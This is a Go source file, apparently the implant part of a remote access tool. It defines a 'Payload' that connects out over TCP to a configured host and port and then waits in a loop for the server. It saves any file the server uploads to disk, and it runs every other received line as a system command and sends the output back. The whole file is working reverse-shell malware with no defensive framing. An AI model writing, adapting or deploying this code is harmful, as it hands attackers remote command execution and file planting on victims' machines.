package payload

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
)

// BufferSize is the amount of bytes being recevied from the server
// when uploading a file
const BufferSize = 1024

// Payload needs description
type Payload struct {
	Port   int
	Target string
	Conn   net.Conn
}

// Run executes the payload
func (p *Payload) Run() {
	addr := p.Target + ":" + strconv.Itoa(p.Port)
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		fmt.Println("[ERROR] dialing connection", err)
	}
	defer conn.Close()

	p.Conn = conn

	for {
		// commandByteBuffer is the firt 2 bytes being sent by the server
		// we grab this to check if the server is sending over any special commands
		// to upload a file or execute a program
		commandByteBuffer := make([]byte, 2)
		p.Conn.Read(commandByteBuffer)

		switch {
		case string(commandByteBuffer) == "u:":
			p.receiveFile()
			break
		default:
			// Wait for a message from the command control center
			p.executeCommand(commandByteBuffer)
		}
	}
}

func (p *Payload) receiveFile() {
	bufferFileName := make([]byte, 64)
	bufferFileSize := make([]byte, 10)

	p.Conn.Read(bufferFileSize)
	fileSize, err := strconv.ParseInt(strings.Trim(string(bufferFileSize), ":"), 10, 64)
	if err != nil {
		p.Conn.Write([]byte("[ERROR] converting string to int " + err.Error() + "\n\r"))
		fmt.Println(err)
		return
	}

	p.Conn.Read(bufferFileName)
	fileName := strings.Trim(string(bufferFileName), ":")

	newFile, err := os.Create(fileName)
	if err != nil {
		fmt.Println(err)
		p.Conn.Write([]byte("[ERROR] creating file " + err.Error() + "\n\r"))
		return
	}
	defer newFile.Close()

	var receivedBytes int64

	for {
		if (fileSize - receivedBytes) < BufferSize {
			io.CopyN(newFile, p.Conn, (fileSize - receivedBytes))
			break
		}
		io.CopyN(newFile, p.Conn, BufferSize)
		receivedBytes += BufferSize
	}
	p.Conn.Write([]byte("Received file completely! \n\r"))
}

func (p *Payload) executeCommand(commandByteBuffer []byte) {
	// read the incoming message
	msg, err := bufio.NewReader(p.Conn).ReadString('\r')
	if err != nil {
		p.Conn.Write([]byte("[ERROR] reading the sent message " + err.Error() + "\n\r"))
		return
	}

	// fullmsg is the full message. since commandByteBuffer read the first 2 bytes
	// and this is not a special command we need those 2 bytez so we add it to the remaing
	// message from the server
	fullmsg := string(commandByteBuffer) + msg

	// Prepare the command line argument we are going to call
	cmdArgs := strings.Split(strings.TrimSpace(fullmsg), " ")
	mcmd := cmdArgs[0]
	cmdArgs = append(cmdArgs[:0], cmdArgs[0+1:]...)

	// execute the command line argument
	cmd := exec.Command(mcmd, cmdArgs...)
	output, err := cmd.Output()
	if err != nil {
		// let the server know we could not execute the command
		p.Conn.Write([]byte("Failed command: " + err.Error() + " \n\r"))
		return
	}
	// send back the command output to the server
	p.Conn.Write([]byte(string(output) + "\r"))
}
